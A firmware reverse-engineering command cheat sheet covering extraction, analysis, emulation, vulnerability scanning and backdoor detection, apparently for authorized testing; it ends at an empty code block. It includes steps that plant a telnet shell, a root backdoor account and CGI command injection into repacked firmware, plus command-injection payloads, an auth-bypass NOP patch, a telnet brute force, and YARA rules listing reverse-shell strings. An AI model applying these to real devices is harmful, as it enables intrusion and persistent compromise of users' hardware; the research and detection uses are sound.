# Firmware Reverse Engineering -- Payloads & Commands

> This file is a companion to `SKILL.md`, containing firmware extraction, analysis, emulation, and vulnerability scanning commands organized by phase.
> Purpose: Quickly find the right tool and command for each firmware analysis phase, ready to copy for testing.
> All payloads are for authorized security testing only.

---

## Index

1. [Firmware Acquisition](#1-firmware-acquisition)
2. [Filesystem Extraction](#2-filesystem-extraction)
3. [Firmware Analysis](#3-firmware-analysis)
4. [Emulation](#4-emulation)
5. [Vulnerability Scanning](#5-vulnerability-scanning)
6. [Backdoor Detection](#6-backdoor-detection)

---

## 1. Firmware Acquisition

### 1.1 Vendor Firmware Download

```bash
# Download firmware from vendor support page
wget -O firmware.bin "https://vendor.com/support/firmware/router-v2.1.3.bin"

# Verify downloaded firmware integrity
sha256sum firmware.bin
md5sum firmware.bin

# Quick initial identification
file firmware.bin
binwalk firmware.bin
```

### 1.2 Entropy Analysis (Pre-Extraction Recon)

```bash
# Plot entropy across firmware image to identify regions
binwalk -E firmware.bin
# High entropy (>0.9) throughout = encrypted or packed
# Mixed entropy = identifiable compressed sections and headers
# Low entropy regions = plaintext config, bootloader, or padding

# Generate entropy plot as PNG
binwalk -E --plot=/tmp/entropy_plot.png firmware.bin
```

### 1.3 Firmware Header Inspection

```bash
# Identify firmware image header format
hexdump -C firmware.bin | head -50

# Look for common header magic bytes
# uImage: 27 05 19 56
# TRX (Broadcom): 48 44 52 30
# TP-Link: header with version, model, firmware length
binwalk -y uimage firmware.bin
binwalk -y trx firmware.bin
```

---

## 2. Filesystem Extraction

### 2.1 binwalk Signature Scanning

```bash
# Scan for all known signatures
binwalk firmware.bin

# Scan with verbose output
binwalk -v firmware.bin

# Filter for specific signature types
binwalk -y squashfs firmware.bin
binwalk -y jffs2 firmware.bin
binwalk -y cpio firmware.bin
binwalk -y uimage firmware.bin

# Scan and display entropy alongside signatures
binwalk -E firmware.bin
```

### 2.2 binwalk Extraction

```bash
# Extract all identified filesystems and components
binwalk -e firmware.bin

# Recursive extraction (extract from extracted files)
binwalk -Me firmware.bin

# Extract to specific directory
binwalk -e -C /tmp/fw_extracted firmware.bin

# Extract with root permissions (some SquashFS requires this)
binwalk -e --run-as=root firmware.bin

# Manual extraction using dd with offsets from binwalk scan
# Example: SquashFS at offset 0x200000, size 0x300000
dd if=firmware.bin of=squashfs.img bs=1 skip=$((0x200000)) count=$((0x300000))

# Extract specific signature type only
binwalk --dd='squashfs:*' firmware.bin
binwalk --dd='jffs2:*' firmware.bin
```

### 2.3 sasquatch (Non-Standard SquashFS)

```bash
# Install sasquatch (patches unsquashfs for vendor-modified formats)
# git clone https://github.com/devttys0/sasquatch.git
# cd sasquatch && ./build.sh

# Extract SquashFS image that standard unsquashfs cannot handle
sasquatch squashfs.img

# Extract to specific directory
sasquatch -d /tmp/squashfs-root squashfs.img

# Force specific endianness
sasquatch -be squashfs.img    # big-endian
sasquatch -le squashfs.img    # little-endian

# Standard unsquashfs (for comparison -- if this fails, use sasquatch)
unsquashfs -d /tmp/squashfs-root squashfs.img
unsquashfs -l squashfs.img     # list contents without extracting
```

### 2.4 jefferson (JFFS2 Extraction)

```bash
# Install jefferson
# pip install jefferson

# Extract JFFS2 filesystem image
jefferson jffs2.img -d /tmp/jffs2-root/

# JFFS2 from NAND flash dump (may need to strip OOB data first)
jefferson nand_dump.img -d /tmp/jffs2-root/

# Verify extraction
find /tmp/jffs2-root/ -type f | wc -l
ls -la /tmp/jffs2-root/
```

### 2.5 unblob (Multi-Format Extraction)

```bash
# Install unblob
# pip install unblob

# Extract with auto-detection of all embedded formats
unblob -e /tmp/unblob_out firmware.bin

# Recursive extraction depth
unblob -e /tmp/unblob_out -d 5 firmware.bin

# Verbose output for debugging extraction issues
unblob -e /tmp/unblob_out -v firmware.bin

# List detected chunks without extracting
unblob --show-chunks firmware.bin
```

### 2.6 firmware-mod-kit

```bash
# Install firmware-mod-kit
# git clone https://github.com/rampageX/firmware-mod-kit.git
# cd firmware-mod-kit && ./install.sh

# Extract firmware automatically
./extract-firmware.sh firmware.bin

# Build/modify firmware after changes
./build-firmware.sh firmware.bin

# Extract specific filesystem type
./uncramfs_all.sh squashfs.img /tmp/squashfs-root/

# Repack modified firmware
./repack-firmware.sh modified_rootfs/ output_firmware.bin
```

### 2.7 Other Filesystem Types

```bash
# CramFS
cramfsck -x /tmp/cramfs-root cramfs.img

# UBIFS (requires UBI kernel module)
modprobe ubi
ubiattach -p /dev/mtd3
mount -t ubifs ubi0_0 /mnt/ubifs

# initramfs / cpio archive
mkdir /tmp/initrd-root && cd /tmp/initrd-root
zcat /tmp/initrd.img | cpio -idmv
# or: cpio -idmv < /tmp/initrd.img

# ext2/3/4 loop mount
mount -o loop,ro ext2.img /mnt/ext2

# UBI image extraction (requires ubireader_extract_files)
# pip install ubi_reader
ubireader_extract_files ubi.img -o /tmp/ubi-root/
```

---

## 3. Firmware Analysis

### 3.1 Filesystem Inventory

```bash
# Set firmware root variable
FWROOT="/tmp/squashfs-root"

# Count files by type
find "$FWROOT" -type f | wc -l
find "$FWROOT" -type d | wc -l

# List all executables with architecture info
find "$FWROOT" -type f -executable -exec file {} \; | grep -E "ARM|MIPS|PowerPC|x86"

# Find SUID/SGID binaries
find "$FWROOT" -perm -4000 -o -perm -2000

# List all shell scripts
find "$FWROOT" -name "*.sh" -type f

# Identify shared libraries
find "$FWROOT" -name "*.so*" -type f -exec file {} \;
```

### 3.2 Credential and Secret Hunting

```bash
# Password files
cat "$FWROOT/etc/passwd"
cat "$FWROOT/etc/shadow"

# Hardcoded passwords in config files
grep -r -i "password\s*=" "$FWROOT" --include="*.conf" --include="*.cfg" --include="*.sh" --include="*.lua" --include="*.json"

# API keys and tokens
grep -r -E "(api_key|apikey|secret_key|access_token|private_key)\s*[:=]" "$FWROOT" -i | head -30

# Private keys and certificates
find "$FWROOT" -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "*.p12" 2>/dev/null
grep -r "BEGIN.*PRIVATE KEY" "$FWROOT" -l 2>/dev/null

# WiFi credentials
grep -r -i "ssid\|wpa_passphrase\|wifi_pass\|wpa_psk" "$FWROOT" | head -20

# Hardcoded IPs and URLs
grep -r -E '([0-9]{1,3}\.){3}[0-9]{1,3}' "$FWROOT/etc/" | grep -v "255\|0\.0\.0" | head -30
grep -r -E 'https?://[a-zA-Z0-9._/-]+' "$FWROOT" --include="*.sh" --include="*.lua" --include="*.conf" | head -20
```

### 3.3 Service and Network Analysis

```bash
# Find web server configurations
find "$FWROOT" -name "httpd.conf" -o -name "nginx.conf" -o -name "lighttpd.conf" -o -name "apache2.conf" 2>/dev/null

# Find listening services in init scripts
grep -r "telnetd\|sshd\|httpd\|ftpd\|dropbear\|mini_httpd\|goahead" "$FWROOT/etc/init.d/" "$FWROOT/etc/rc.d/" 2>/dev/null

# Find CGI scripts (high-value targets for command injection)
find "$FWROOT" -path "*/cgi-bin/*" -type f 2>/dev/null
find "$FWROOT" -name "*.cgi" -type f 2>/dev/null

# Analyze CGI scripts for dangerous function calls
find "$FWROOT" -name "*.cgi" -exec strings {} \; | grep -E "system\(|popen\(|exec[vl]?p?\(" | head -20

# Check for debugging interfaces left in production
grep -r "gdb\|strace\|telnet\|debug" "$FWROOT/etc/" --include="*.sh" --include="*.conf" | head -20
```

### 3.4 Binary Component Analysis

```bash
# Identify all binaries and their architectures
find "$FWROOT/bin" "$FWROOT/sbin" "$FWROOT/usr/bin" "$FWROOT/usr/sbin" -type f -exec file {} \; 2>/dev/null

# Check BusyBox version (common attack vector)
strings "$FWROOT/bin/busybox" | grep "BusyBox v"
strings "$FWROOT/bin/busybox" | grep -i "applet"

# Check OpenSSL version
find "$FWROOT" -name "libssl*" -o -name "libcrypto*" 2>/dev/null | xargs strings 2>/dev/null | grep "OpenSSL" | head -5

# Find binaries with dangerous functions
find "$FWROOT" -type f -executable | while read f; do
  if file "$f" | grep -qE "ELF|ARM|MIPS"; then
    strings "$f" | grep -E "system\(|popen\(|exec[vl]?p?\(|strcpy\(|sprintf\(" > /dev/null && echo "$f"
  fi
done

# Version string extraction for CVE matching
find "$FWROOT" -name "version" -o -name "VERSION" -o -name "buildinfo" 2>/dev/null | xargs cat 2>/dev/null
strings "$FWROOT/bin/httpd" 2>/dev/null | grep -E "Server:|version|v[0-9]+\.[0-9]+" | head -10
```

---

## 4. Emulation

### 4.1 QEMU User-Mode Emulation (Single Binary)

```bash
# Run ARM binary on x86 host
qemu-arm-static -L "$FWROOT" "$FWROOT/bin/busybox" --list

# Run MIPS (big-endian) binary
qemu-mips-static -L "$FWROOT" "$FWROOT/bin/httpd"

# Run MIPS (little-endian) binary
qemu-mipsel-static -L "$FWROOT" "$FWROOT/bin/httpd"

# Run with strace for system call monitoring
qemu-arm-static -strace -L "$FWROOT" "$FWROOT/bin/httpd"

# Run with environment variables
qemu-arm-static -L "$FWROOT" -E REQUEST_METHOD=GET -E QUERY_STRING="test" "$FWROOT/usr/bin/cgi-bin/test.cgi"

# Run with GDB stub for remote debugging
qemu-arm-static -g 1234 -L "$FWROOT" "$FWROOT/bin/httpd"
# Then connect: gdb-multiarch -ex "target remote :1234" "$FWROOT/bin/httpd"
```

### 4.2 QEMU Full-System Emulation

```bash
# ARM full-system emulation with kernel and rootfs
qemu-system-arm -M versatilepb -kernel zImage \
  -drive file=rootfs.ext2,if=ide -nographic -append "root=/dev/sda console=ttyAMA0"

# MIPS (big-endian) full-system emulation
qemu-system-mips -M malta -kernel vmlinux \
  -drive file=rootfs.ext2,format=raw -nographic \
  -append "root=/dev/sda console=ttyS0"

# MIPS (little-endian) full-system emulation
qemu-system-mipsel -M malta -kernel vmlinux \
  -drive file=rootfs.ext2,format=raw -nographic \
  -append "root=/dev/sda console=ttyS0"

# With network (TAP interface for full network access)
sudo tunctl -t tap0
sudo ifconfig tap0 192.168.0.1 up
qemu-system-arm -M versatilepb -kernel zImage \
  -net nic -net tap,ifname=tap0,script=no \
  -drive file=rootfs.ext2,if=ide -nographic \
  -append "root=/dev/sda console=ttyAMA0 ip=192.168.0.2"

# Forward specific port for web service testing
qemu-system-arm -M versatilepb -kernel zImage \
  -net user,hostfwd=tcp::8080-:80 \
  -drive file=rootfs.ext2,if=ide -nographic \
  -append "root=/dev/sda console=ttyAMA0"
```

### 4.3 Firmadyne Automated Emulation

```bash
# Setup Firmadyne
git clone https://github.com/firmadyne/firmadyne.git
cd firmadyne
./download.sh          # Download binaries

# Setup database
sudo service postgresql start
sudo -u postgres createuser firmadyne
sudo -u postgres createdb firmware
sudo -u postgres psql -d firmware < ./database/schema

# Configure Firmadyne
cd firmadyne
echo "FIRMADYNE_PATH=/path/to/firmadyne" > firmadyne.config

# Step 1: Extract firmware (binwalk + store in DB)
sudo python3 ./sources/extractor/extractor.py -b firmware.bin -sql \
  -np -nk "firmware.bin" images

# Step 2: Identify architecture
sudo python3 ./scripts/getArch.py images/<image_id>.tar.gz

# Step 3: Load filesystem into database
sudo python3 ./scripts/tar2db.py -i <image_id> -f images/<image_id>.tar.gz

# Step 4: Create QEMU image
sudo python3 ./scripts/makeImage.sh <image_id>

# Step 5: Infer network configuration
sudo python3 ./scripts/inferNetwork.sh <image_id>

# Step 6: Boot firmware in QEMU
sudo ./scripts/run.armel.sh <image_id>
sudo ./scripts/run.mipseb.sh <image_id>
sudo ./scripts/run.mipsel.sh <image_id>

# Access emulated firmware
# Network interface will be configured with the inferred IP
# Web interface typically at http://<inferred_ip>/
```

### 4.4 Network Setup for Emulation

```bash
# Create bridge for emulated firmware network access
sudo brctl addbr br0
sudo brctl addif br0 tap0
sudo ifconfig br0 192.168.1.1 up
sudo ifconfig tap0 0.0.0.0 up

# Enable IP forwarding and NAT for internet access
sudo sysctl -w net.ipv4.ip_forward=1
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE
sudo iptables -A FORWARD -i br0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o br0 -m state --state RELATED,ESTABLISHED -j ACCEPT

# Scan emulated firmware for open ports
nmap -sV -p- 192.168.1.2
```

---

## 5. Vulnerability Scanning

### 5.1 firmwalker Automated Scan

```bash
# Install firmwalker
git clone https://github.com/craigz28/firmwalker.git

# Run scan on extracted firmware filesystem
bash firmwalker/firmwalker.sh /tmp/squashfs-root/ /tmp/firmwalker-report.txt

# Review results
cat /tmp/firmwalker-report.txt | less

# Firmwalker searches for:
# - etc/shadow and etc/passwd
# - Scripts (sh, py, lua, php)
# - Binary files (executables, shared libraries)
# - Web server configs
# - Hardcoded IPs
# - URLs and domains
# - SSL/TLS certificates
# - Email addresses
# - Common backdoor indicators
```

### 5.2 Automated Vulnerability Pattern Scan

```bash
#!/bin/bash
# Comprehensive firmware vulnerability scanner
FWROOT="${1:?Usage: $0 <firmware_root>}"
REPORT="/tmp/fw_vuln_scan_$(date +%Y%m%d_%H%M%S).txt"

echo "=== Firmware Vulnerability Scan ===" > "$REPORT"
echo "Target: $FWROOT" >> "$REPORT"
echo "Date: $(date -Iseconds)" >> "$REPORT"
echo "" >> "$REPORT"

echo "[1] Hardcoded credentials" >> "$REPORT"
grep -r -i "password\s*=\|passwd\s*=\|admin\s*=" "$FWROOT" \
  --include="*.conf" --include="*.cfg" --include="*.sh" --include="*.lua" \
  >> "$REPORT" 2>/dev/null

echo "" >> "$REPORT"
echo "[2] Private keys" >> "$REPORT"
find "$FWROOT" -name "*.pem" -o -name "*.key" -o -name "id_rsa" -o -name "*.p12" \
  >> "$REPORT" 2>/dev/null
grep -rl "BEGIN.*PRIVATE KEY" "$FWROOT" >> "$REPORT" 2>/dev/null

echo "" >> "$REPORT"
echo "[3] Dangerous function calls in binaries" >> "$REPORT"
find "$FWROOT" -type f -executable | while read f; do
  if file "$f" | grep -qE "ELF"; then
    strings "$f" | grep -E "system\(|popen\(|exec[vl]?p?\(" > /dev/null && echo "$f" >> "$REPORT"
  fi
done 2>/dev/null

echo "" >> "$REPORT"
echo "[4] Cleartext services" >> "$REPORT"
grep -r "telnetd\|ftpd\|rshd" "$FWROOT/etc/" >> "$REPORT" 2>/dev/null

echo "" >> "$REPORT"
echo "[5] CGI scripts (command injection targets)" >> "$REPORT"
find "$FWROOT" -name "*.cgi" >> "$REPORT" 2>/dev/null

echo "[SCAN] Report: $REPORT"
```

---

## 6. Backdoor Detection

### 6.1 YARA Rule Scanning

```bash
# Scan extracted firmware with YARA rules
yara -r firmware_backdoors.yar /tmp/squashfs-root/ > /tmp/yara-findings.txt

# Scan with statistics
yara -r -s firmware_backdoors.yar /tmp/squashfs-root/ | tee /tmp/yara-detailed.txt

# Scan specific binary types only
find /tmp/squashfs-root/ -type f -name "*.elf" -o -name "*.bin" | xargs yara backdoor_rules.yar
```

### 6.2 YARA Rules for Firmware Backdoors

```yaml
// firmware_backdoors.yar -- YARA rules for common firmware backdoor patterns

rule HiddenTelnetBackdoor {
    meta:
        description = "Detects hidden Telnet backdoor in firmware binaries"
        severity = "critical"
    strings:
        $s1 = "telnetd" ascii nocase
        $s2 = "telnetd -l /bin/sh" ascii
        $s3 = "/bin/sh -i" ascii
        $s4 = "Authorization: Backdoor" ascii nocase
    condition:
        uint16(0) == 0x457f and filesize < 10MB and 2 of ($s1, $s2, $s3, $s4)
}

rule HardcodedCredentials {
    meta:
        description = "Detects hardcoded credential patterns in firmware"
        severity = "high"
    strings:
        $s1 = /password\s*[=:]\s*["'][^"']{3,20}["']/ nocase
        $s2 = /admin[a-zA-Z]*\s*[=:]\s*["'][^"']{3,20}["']/ nocase
        $s3 = "root::0:0" ascii
        $s4 = "default password" ascii nocase
    condition:
        2 of ($s1, $s2, $s3, $s4)
}

rule SuspiciousReverseShell {
    meta:
        description = "Detects reverse shell patterns in firmware scripts"
        severity = "critical"
    strings:
        $s1 = "/dev/tcp/" ascii
        $s2 = "nc -e /bin/sh" ascii nocase
        $s3 = "bash -i >& /dev/tcp" ascii
        $s4 = "socat exec:'bash -li' tcp" ascii nocase
    condition:
        any of ($s1, $s2, $s3, $s4)
}

rule CommandInjectionCGI {
    meta:
        description = "Detects potential command injection in CGI scripts"
        severity = "high"
    strings:
        $s1 = "system(" ascii
        $s2 = "popen(" ascii
        $s3 = /QUERY_STRING|REQUEST_URI|HTTP_/ ascii
    condition:
        $s3 and any of ($s1, $s2)
}

rule DebugInterfaceLeftInProduction {
    meta:
        description = "Detects debug interfaces left enabled in production firmware"
        severity = "medium"
    strings:
        $s1 = "gdbserver" ascii nocase
        $s2 = "strace" ascii nocase
        $s3 = "/proc/kcore" ascii
        $s4 = "debug=1" ascii nocase
        $s5 = "diag_mode" ascii nocase
    condition:
        2 of ($s1, $s2, $s3, $s4, $s5)
}
```

### 6.3 Firmware Diffing (Version Comparison)

```bash
# Extract both firmware versions
binwalk -e -C /tmp/fw_v1 old_firmware.bin
binwalk -e -C /tmp/fw_v2 new_firmware.bin

# Compare directory trees
diff -rq /tmp/fw_v1/squashfs-root/ /tmp/fw_v2/squashfs-root/ > /tmp/fw_diff.txt

# Find modified files only
grep "^Files " /tmp/fw_diff.txt

# Compare specific binaries (disassembly diff)
# Use radare2 to dump disassembly for both
r2 -A /tmp/fw_v1/bin/httpd -c "aflj" -q > /tmp/v1_funcs.json
r2 -A /tmp/fw_v2/bin/httpd -c "aflj" -q > /tmp/v2_funcs.json

# Compare function lists
diff /tmp/v1_funcs.json /tmp/v2_funcs.json

# Binary-level comparison with bindiff
# Generate BinExport files from IDA/Ghidra, then compare

# Find added/removed files
grep "^Only in /tmp/fw_v1" /tmp/fw_diff.txt   # Removed in v2
grep "^Only in /tmp/fw_v2" /tmp/fw_diff.txt   # Added in v2

# Compare configuration files for security-relevant changes
diff -u /tmp/fw_v1/squashfs-root/etc/passwd /tmp/fw_v2/squashfs-root/etc/passwd
diff -u /tmp/fw_v1/squashfs-root/etc/init.d/ /tmp/fw_v2/squashfs-root/etc/init.d/
```

### 6.4 Known CVE Matching

```bash
# Extract version strings from firmware components
FWROOT="/tmp/squashfs-root"

# BusyBox version
BB_VER=$(strings "$FWROOT/bin/busybox" | grep -oP 'BusyBox v[\d.]+' | head -1)
echo "BusyBox: $BB_VER"

# Kernel version
K_VER=$(strings "$FWROOT/bin/busybox" | grep -oP 'Linux version [\d.]+' | head -1)
echo "Kernel: $K_VER"

# OpenSSL version
SSL_VER=$(find "$FWROOT" -name "libssl*" 2>/dev/null | xargs strings 2>/dev/null | grep -oP 'OpenSSL [\d.]+' | head -1)
echo "OpenSSL: $SSL_VER"

# Web server version
HTTPD_VER=$(strings "$FWROOT/bin/httpd" 2>/dev/null | grep -iE "server:|httpd" | head -5)
echo "HTTPD: $HTTPD_VER"

# Search CVEs for identified versions
# searchsploit busybox $BB_VER
# searchsploit linux kernel $K_VER
```

---

## 7. Binary Analysis and Reverse Engineering

### 7.1 Static Binary Analysis with radare2

```bash
# Open firmware binary in radare2 for analysis
r2 -A "$FWROOT/bin/httpd"

# List all detected functions
r2 -c "afl" "$FWROOT/bin/httpd"

# Search for dangerous function calls (system, strcpy, sprintf)
r2 -c "afl~system,popen,exec,strcpy,sprintf" "$FWROOT/bin/httpd"

# Analyze a specific function
r2 -c "s sym.main; pdf" "$FWROOT/bin/httpd"

# Extract all strings from a binary section
r2 -c "iz" "$FWROOT/bin/httpd" | head -100

# Cross-reference references to system() function
r2 -c "axt @ sym.imp.system" "$FWROOT/bin/httpd"

# Generate function call graph
r2 -c "agCd" "$FWROOT/bin/httpd" > callgraph.dot
```

### 7.2 Ghidra Headless Analysis

```bash
# Import firmware binary into Ghidra project headlessly
analyzeHeadless /tmp/ghidra_project firmware_project \
  -import "$FWROOT/bin/httpd" \
  -postScript /tmp/analyze.py \
  -scriptPath /tmp

# Example analysis script (/tmp/analyze.py)
cat > /tmp/analyze.py << 'PYEOF'
from ghidra.program.model.symbol import SymbolType
listing = currentProgram.getListing()
fm = currentProgram.getFunctionManager()
for func in fm.getFunctions(True):
    body = func.getBody()
    for block in body:
        iter = listing.getInstructions(block, True)
        for inst in iter:
            if "CALL" in str(inst) and "system" in str(inst):
                print("VULN: {} calls system() at {}".format(func.getName(), inst.getAddress()))
PYEOF

# Export decompiled C code for all functions
analyzeHeadless /tmp/ghidra_project firmware_project \
  -process "httpd" \
  -postScript DecompileToStdout.java
```

### 7.3 Binary Hardening Check

```bash
# Check for NX (non-executable stack) support
readelf -l "$FWROOT/bin/httpd" | grep -E "GNU_STACK|NX"

# Check for RELRO (relocation read-only)
readelf -l "$FWROOT/bin/httpd" | grep -E "GNU_RELRO"
readelf -d "$FWROOT/bin/httpd" | grep -E "BIND_NOW"

# Check for PIE (position-independent executable)
readelf -h "$FWROOT/bin/httpd" | grep "Type"

# Check for stack canary support
strings "$FWROOT/bin/httpd" | grep -i "__stack_chk"

# Comprehensive hardening check with checksec
checksec --file="$FWROOT/bin/httpd"

# Batch check all firmware executables
find "$FWROOT" -type f -executable | while read f; do
  if file "$f" | grep -q ELF; then
    echo "=== $(basename $f) ==="
    checksec --file="$f" 2>/dev/null
  fi
done
```

---

## 8. Firmware Modification and Repacking

### 8.1 Firmware Modification Workflow

```bash
# Extract firmware
binwalk -e firmware.bin
cd /tmp/_firmware.bin.extracted/squashfs-root/

# Modify a configuration file (e.g., enable telnet)
echo "telnetd -l /bin/sh &" >> etc/rc.local

# Add a backdoor account
echo "backdoor:BackD00r:0:0:root:/root:/bin/sh" >> etc/passwd

# Modify a CGI script to add command injection
sed -i 's/system(cmd)/system(getenv("HTTP_CMD"))/' usr/bin/cgi-bin/admin.cgi

# Repack SquashFS filesystem
mksquashfs /tmp/_firmware.bin.extracted/squashfs-root/ modified.bin -comp xz

# Reassemble firmware with modified SquashFS at correct offset
dd if=firmware.bin of=modified_firmware.bin bs=1 count=$((0x200000))
dd if=modified.bin of=modified_firmware.bin bs=1 seek=$((0x200000))
dd if=firmware.bin of=modified_firmware.bin bs=1 skip=$((0x500000)) seek=$((0x500000))
```

### 8.2 Firmware Integrity Verification

```bash
# Generate checksum of original firmware
sha256sum firmware.bin > firmware_checksums.txt

# Compare original and modified firmware sizes
ls -la firmware.bin modified_firmware.bin

# Binary diff to confirm only intended changes were made
radiff2 firmware.bin modified_firmware.bin

# Extract both and compare directory trees
binwalk -e -C /tmp/original firmware.bin
binwalk -e -C /tmp/modified modified_firmware.bin
diff -rq /tmp/original/squashfs-root/ /tmp/modified/squashfs-root/
```

---

## 9. IoT Firmware Dynamic Testing

### 9.1 Emulated Web Interface Testing

```bash
# After QEMU emulation is running (see Section 4)
# Discover web interface endpoints
dirb http://192.168.1.2/ /usr/share/wordlists/dirb/common.txt

# Test for command injection in CGI parameters
curl "http://192.168.1.2/cgi-bin/admin.cgi?action=ping&target=127.0.0.1%3Bid"
curl "http://192.168.1.2/cgi-bin/admin.cgi?action=ping&target=127.0.0.1%60id%60"
curl "http://192.168.1.2/cgi-bin/admin.cgi?action=ping&target=127.0.0.1%7Cid"

# Test authentication bypass
curl "http://192.168.1.2/cgi-bin/admin.cgi" -H "Cookie: auth=1"
curl "http://192.168.1.2/admin/" -H "Authorization: Basic YWRtaW46YWRtaW4="

# Fuzz CGI parameters with ffuf
ffuf -u "http://192.168.1.2/cgi-bin/admin.cgi?action=FUZZ" \
  -w /usr/share/seclists/Fuzzing/command-injection.txt \
  -mc 200 -fs 0
```

### 9.2 Network Service Testing on Emulated Firmware

```bash
# Scan all ports on emulated firmware
nmap -sV -p- 192.168.1.2

# Test for default Telnet credentials
hydra -l root -P /usr/share/wordlists/dirb/password.txt telnet://192.168.1.2

# Test UPnP service (common in router firmware)
upnp-client --discover 192.168.1.2
nmap -sU -p 1900 --script upnp-info 192.168.1.2

# Test for TR-069 (CWMP) management interface
nmap -p 7547 --script http-enum 192.168.1.2
curl "http://192.168.1.2:7547/" -v
```

---

## 10. Firmware Binary Diffing with Binwalk and Bindiff

### 10.1 Automated Firmware Comparison

```bash
# Compare two firmware versions using binwalk entropy
binwalk -E --plot=/tmp/v1_entropy.png firmware_v1.bin
binwalk -E --plot=/tmp/v2_entropy.png firmware_v2.bin

# Extract and diff firmware strings for version changes
strings firmware_v1.bin | sort > /tmp/v1_strings.txt
strings firmware_v2.bin | sort > /tmp/v2_strings.txt
diff /tmp/v1_strings.txt /tmp/v2_strings.txt | grep "^[<>]" | head -50

# Binary diff with radare2
r2 -A /tmp/fw_v1/bin/httpd -c "pdr @ sym.main" > /tmp/v1_main_disasm.txt
r2 -A /tmp/fw_v2/bin/httpd -c "pdr @ sym.main" > /tmp/v2_main_disasm.txt
diff /tmp/v1_main_disasm.txt /tmp/v2_main_disasm.txt
```

### 10.2 Firmware Vulnerability Chaining

```bash
# Chain: extract -> analyze -> emulate -> exploit
# Step 1: Extract
binwalk -Me firmware.bin -C /tmp/fw_work

# Step 2: Find web server binary
find /tmp/fw_work -name "httpd" -o -name "mini_httpd" -o -name "goahead" | head -5

# Step 3: Identify architecture
file /tmp/fw_work/squashfs-root/usr/bin/httpd

# Step 4: Run with QEMU user-mode
qemu-arm-static -L /tmp/fw_work/squashfs-root /tmp/fw_work/squashfs-root/usr/bin/httpd -p 8080 &

# Step 5: Fuzz web endpoints
ffuf -u "http://127.0.0.1:8080/cgi-bin/FUZZ" -w /usr/share/seclists/Fuzzing/CGI-URLs.txt
```

### 10.3 Memory Dump Analysis of Emulated Firmware

```bash
# Dump QEMU VM memory for analysis
(qemu) pmemsave 0 0x10000000 /tmp/fw_memdump.bin

# Search memory dump for credentials
strings /tmp/fw_memdump.bin | grep -iE "password|admin|root|key" | head -30

# Search memory dump for URLs and IPs
strings /tmp/fw_memdump.bin | grep -oE '(https?://[a-zA-Z0-9._/-]+|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})' | sort -u

# Extract ELF binaries from memory dump
foremost -t all -i /tmp/fw_memdump.bin -o /tmp/mem_extracted/

# Analyze memory dump with Volatility (if QEMU dump format supported)
volatility -f /tmp/fw_memdump.bin imageinfo
```

---

## 11. Firmware String Analysis and Pattern Extraction

### Comprehensive String Extraction

```bash
# Extract all printable strings with minimum length
strings -n 8 firmware.bin | sort -u > /tmp/fw_strings.txt

# Extract strings and filter for credentials
strings -n 6 firmware.bin | grep -iE "password|passwd|secret|key|token|admin|root" > /tmp/fw_creds.txt

# Extract URL patterns from firmware
strings firmware.bin | grep -oE 'https?://[^ "]+' | sort -u > /tmp/fw_urls.txt

# Extract email addresses from firmware
strings firmware.bin | grep -oE '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' | sort -u

# Extract potential encryption keys
strings firmware.bin | grep -E '^[A-Za-z0-9+/]{32,}={0,2}$' | head -20
```

### Binary Diffing with radare2

```bash
# Compare two binary versions with radare2
r2 -A -c "aflj" /tmp/fw_v1/bin/httpd > /tmp/v1_funcs.json
r2 -A -c "aflj" /tmp/fw_v2/bin/httpd > /tmp/v2_funcs.json
diff <(jq -r '.[].name' /tmp/v1_funcs.json) <(jq -r '.[].name' /tmp/v2_funcs.json)

# Find patched functions between versions
r2 -c "zigi" /tmp/fw_v1/bin/httpd /tmp/fw_v2/bin/httpd
```

### Automated CVE Database Lookup

```bash
# Extract versions and search exploitdb
FWROOT="/tmp/squashfs-root"
BB_VER=$(strings "$FWROOT/bin/busybox" | grep -oP 'BusyBox v[\d.]+' | head -1)
searchsploit "$BB_VER" 2>/dev/null

# Search for kernel CVEs
K_VER=$(strings "$FWROOT/bin/busybox" | grep -oP 'Linux version [\d.]+' | head -1)
searchsploit "linux kernel $(echo $K_VER | grep -oP '[\d.]+')" 2>/dev/null

# Batch version extraction and CVE search
find "$FWROOT" -name "*.so" -exec strings {} \; | grep -oP '(OpenSSL|Dropbear|lighttpd|nginx|SQLite) [\d.]+' | sort -u | while read comp; do
  echo "Searching: $comp"
  searchsploit "$comp" 2>/dev/null | head -10
done
```

---

## 12. Firmware Emulation Debugging

### QEMU Debugging with GDB Multiarch

```bash
# Start QEMU with GDB stub for remote debugging of firmware binary
qemu-arm-static -g 1234 -L "$FWROOT" "$FWROOT/bin/httpd" &

# Connect GDB multiarch
gdb-multiarch "$FWROOT/bin/httpd" -ex "set architecture arm" -ex "target remote :1234"

# Common GDB commands for firmware debugging
# Set breakpoint at main
b main
# Continue execution
continue
# Examine memory at address
x/20x 0x10000
# Step through instructions
stepi 10
```

### Firmware Network Service Debugging

```bash
# Strace a firmware binary to find file and network operations
qemu-arm-static -strace -L "$FWROOT" "$FWROOT/usr/sbin/httpd" 2>&1 | tee /tmp/fw_strace.log

# Find configuration file paths from strace output
grep -E "open|access|stat" /tmp/fw_strace.log | grep -v "ENOENT" | head -20

# Find network binding operations
grep -E "bind|listen|socket|connect" /tmp/fw_strace.log
```

### Firmware Binary Patching

```bash
# Patch a binary to bypass authentication check using hexedit
# First, find the authentication call with radare2
r2 -c "afl~auth" "$FWROOT/bin/httpd"

# Disassemble the auth function
r2 -c "s sym.auth_check; pdf" "$FWROOT/bin/httpd"

# Patch NOP over the auth call (ARM: 0xe1a00000 = NOP)
# Find the BL instruction offset and patch it
r2 -c "wx e1a00000 @ 0x00012340" "$FWROOT/bin/httpd"

# Verify the patch
r2 -c "s 0x00012340; pd 5" "$FWROOT/bin/httpd"
```

---

## 13. Firmware Bootloader Analysis

### U-Boot Bootloader Extraction and Analysis

```bash
# Identify U-Boot bootloader in firmware image
strings firmware.bin | grep -i "u-boot" | head -10
binwalk -y uimage firmware.bin

# Extract U-Boot environment variables
strings firmware.bin | grep -E "bootargs|bootcmd|serverip|bootfile" | head -20

# Analyze U-Boot configuration for boot manipulation potential
dd if=firmware.bin bs=1 skip=$((0x40000)) count=4096 | strings | grep -E "bootcmd|bootargs|env"
```

### Firmware Header Parsing with Custom Scripts

```python
